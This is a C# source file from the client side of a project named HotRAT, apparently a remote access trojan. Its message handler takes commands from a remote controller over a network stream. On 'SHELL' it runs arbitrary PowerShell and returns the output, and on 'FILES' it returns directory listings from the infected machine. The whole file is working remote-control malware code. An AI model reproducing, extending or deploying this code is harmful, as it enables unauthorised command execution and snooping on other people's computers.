using HotRAT.Client.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace HotRAT.Client
{
    internal class MessageHandle
    {
        public static void Handle(string data,NetworkStream ns)
        {
            var lines = data.Split("\\n");
            if (lines.Length == 1)
                lines = data.Split("\n");
            Console.WriteLine(string.Join(" | ", lines));
            switch (lines[0].ToUpper())
            {
                case "SHELL":
                    var shellR = "SHELL\n" + PowerShellExecutor.ExecuteViaProcess(lines[1]);
                    Console.WriteLine(shellR);
                    _ = SendText(shellR, ns);
                    break;
                case "FILES":
                    var dirPath = lines[1][..^9];
                    var filesR = "FILES\n";

                    if (Directory.Exists(dirPath))
                    {
                        var files = Directory.GetFiles(dirPath);
                        foreach (var file in files)
                        {
                            var info = new FileInfo(file);
                            filesR += $"{info.Name}|{info.LastWriteTime:yyyy-MM-dd HH:mm:ss}|FILE\n";
                        }

                        var dirs = Directory.GetDirectories(dirPath);
                        foreach (var dir in dirs)
                        {
                            var info = new DirectoryInfo(dir);
                            filesR += $"{info.Name}|{info.LastWriteTime:yyyy-MM-dd HH:mm:ss}|DIR\n";
                        }
                    }
                    else
                    {
                        filesR += $"路径不存在: {dirPath}\n";
                    }

                    Console.WriteLine(filesR);
                    _ = SendText(filesR, ns);
                    break;

                default:
                    break;
            }
        }
        public static async Task SendText(string text, NetworkStream ns)
        {
            try
            {
                if (ns == null || !ns.CanWrite)
                {
                    Console.WriteLine("网络流不可用或不可写入");
                    return;
                }

                byte[] data = Encoding.UTF8.GetBytes(text);

                byte[] header = BitConverter.GetBytes(data.Length);
                byte[] typeByte = new byte[] { 0x02 };

                byte[] fullMessage = new byte[header.Length + typeByte.Length + data.Length];
                Buffer.BlockCopy(header, 0, fullMessage, 0, header.Length);
                Buffer.BlockCopy(typeByte, 0, fullMessage, header.Length, typeByte.Length);
                Buffer.BlockCopy(data, 0, fullMessage, header.Length + typeByte.Length, data.Length);

                await ns.WriteAsync(fullMessage, 0, fullMessage.Length);
                await ns.FlushAsync();

                Console.WriteLine($"已发送 {data.Length} 字节的文本消息");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"发送消息时出错: {ex.Message}");
            }
        }
    }
}
